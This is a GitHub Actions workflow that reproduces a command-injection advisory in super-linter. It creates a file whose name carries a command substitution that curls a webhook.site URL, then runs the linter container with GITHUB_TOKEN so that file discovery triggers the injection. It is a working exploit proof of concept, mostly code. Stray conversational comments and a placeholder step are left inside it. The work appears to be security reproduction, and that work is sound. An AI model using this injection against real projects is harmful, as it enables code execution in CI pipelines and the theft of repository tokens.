name: Security Repro - GHSA-r79c-pqj3-577x

on:
  workflow_dispatch:
    inputs:
      target_version:
        description: 'The tag of super-linter to test (e.g., v7, v8, slim-v8.2.1)'
        required: true
        default: 'v7'
      webhook_url:
        description: 'Your webhook.site URL to receive the callback'
        required: true
        default: 'https://webhook.site/YOUR-UUID-HERE'

jobs:
  repro-exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: 1. Generate Malicious Filename (The Exploit)
        run: |
          # We construct the filename dynamically to simulate a file introduced by a PR.
          # The payload sends a POST request to the webhook URL.
          
          WEBHOOK="${{ inputs.webhook_url }}"
          
          # Payload: command substitution that curls the webhook
          # We use a simple 'Ping' instead of exfiltrating secrets for safety during this test.
          PAYLOAD="pre\$(curl -fsS -X POST \"$WEBHOOK\" -d \"vulnerable_version=${{ inputs.target_version }}\").md"
          
          echo "Creating malicious file: $PAYLOAD"
          touch "$PAYLOAD"
          
          # Verify file exists
          ls -la

      - name: 2. Run Super-Linter (Target Version)
        # We allow this step to fail because the linter might error out, 
        # but the injection happens during file discovery/initialization.
        continue-on-error: true 
        uses: super-linter/super-linter/slim@main # This is a placeholder
        # dynamic uses is not supported directly in GHA, so we use a different approach below
        # OR simply ask them to edit the 'uses' line. 
        # But actually, simpler approach for them:
        
      # Since we can't dynamically variable-ize the 'uses' clause in GitHub Actions easily,
      # strict reproduction usually asks them to hardcode the version, OR we use docker run manually.
      # But to respect your "Action context" requirement, let's use the docker container directly 
      # which mimics the action's behavior closely.
      
      - name: 2. Run Super-Linter via Docker (Simulating Action)
        run: |
          echo "Testing against image: super-linter/super-linter:${{ inputs.target_version }}"
          
          # Mount current workspace same as the Action does
          docker run --rm \
            -e RUN_LOCAL=true \
            -e GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }} \
            -v "$(pwd):/tmp/lint" \
            ghcr.io/super-linter/super-linter:${{ inputs.target_version }} \
            /bin/bash -c "echo 'Container started'; /action/lib/linter.sh || true"
            
      - name: 3. Check Result
        run: |
          echo "Please check your Webhook URL: ${{ inputs.webhook_url }}"
          echo "If you received a POST request, version ${{ inputs.target_version }} is VULNERABLE."
